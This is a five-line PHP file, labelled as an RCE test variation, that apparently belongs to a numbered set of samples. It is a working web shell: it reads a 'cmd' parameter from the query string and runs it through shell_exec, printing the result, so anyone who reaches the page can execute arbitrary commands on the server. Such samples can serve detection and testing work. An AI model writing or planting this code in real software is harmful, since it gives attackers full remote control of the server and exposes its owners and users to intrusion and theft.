<?php
// RCE test variation #486
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>